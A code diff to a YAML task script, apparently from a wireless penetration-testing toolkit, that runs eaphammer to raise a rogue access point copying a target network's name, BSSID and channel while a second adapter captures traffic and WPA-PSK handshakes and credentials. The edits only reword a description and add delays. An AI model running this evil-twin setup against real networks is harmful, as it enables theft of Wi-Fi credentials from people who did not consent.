@@ -1,5 +1,5 @@
 description: |- 
-  Поднимает поддельные точки доступа по таймауту на одном адаптере и перехватывает трафик на втором - так получается получить наиболее валидные результаты.
+  Поднимает поддельные точки доступа по таймауту на одном адаптере и перехватывает трафик на втором - так выходит получить наиболее валидные результаты.
 
   ВНИМАНИЕ! Любое внешнее логирование судя по всему ломает eaphammer - и встроенные функции bshm, и tee... Мистика!
 tags:
@@ -51,7 +51,7 @@ script: |-
   filenotfound=false;
   for file in #list#; do test -e $file || { filenotfound=true; echo -e "\e[1;91m[error] File $file not exist\e[0m"; }; done;
   if $filenotfound; then exit; fi;
-
+  
   # Функции
   stop_mon_screen() { sudo screen -S pulsar-monitor-proc -X stuff '^C'; };
   exit_func() { stop_mon_screen; exit; };
@@ -74,7 +74,7 @@ script: |-
       # Мониторинг
       echo -e "\e[1;92m[$monitor] Starting capture... \e[0m";
       sudo screen -XS pulsar-monitor-proc quit >/dev/null;
-      sudo nmcli dev set $monitor managed no;
+      sudo nmcli dev set $monitor managed no; sleep 1;
       sudo ip link set $monitor down;
       sudo iw $monitor set monitor control;
       sudo ip link set $monitor up;
@@ -83,9 +83,9 @@ script: |-
       # Точка доступа
       echo -e "\e[1;92m[$interface] Starting access point... \e[0m";
       sudo ip link set $interface down;
-      sudo iw $interface set type managed;
+      sudo iw $interface set type managed; 
       sudo ip link set $interface up;
-      sudo nmcli dev set $interface managed yes;
+      sudo nmcli dev set $interface managed yes; sleep 1;
       sudo timeout -s INT -k 20s #timeout# eaphammer --interface "$interface" --essid "$essid" --auth wpa-psk --password 00000000 --creds --psk-capture-file "$aphsfile" --bssid "$bssid" --channel "$channel";
       
       # Выход
